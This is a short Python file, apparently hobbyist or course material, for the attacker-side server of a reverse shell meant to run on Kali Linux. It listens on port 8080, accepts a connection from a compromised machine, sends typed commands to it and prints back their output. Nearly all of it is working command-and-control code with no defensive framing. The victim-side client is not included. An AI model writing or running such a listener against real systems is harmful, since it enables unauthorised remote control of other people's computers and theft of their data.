# Server on Kali

import socket

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "xxx.xxx.xxx.xxx"  # bind this server to Kali's IP address and port 8080
    Port = 8080
    socket_address = (IP, Port)
    attack_socket.bind(socket_address)
    attack_socket.listen(5)
    print("listening for incoming connection requests")
    attack_socket, client_address = attack_socket.accept()
    print("connection established with ", client_address)
    try:
        while True:
            command = input("Enter the command ")
            attack_socket.send(command.encode())
            if command == "stop":
                attack_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd"):
                attack_socket.send(command.encode())
                continue
            else:
                full_command_result = b""
                while True:
                    chunk = attack_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[: -len(IDENTIFIER)]
                        full_command_result += chunk
                        break

                    full_command_result += chunk
                print(full_command_result.decode())
    except socket.error:
        print("Exception occurred")
        attack_socket.close()
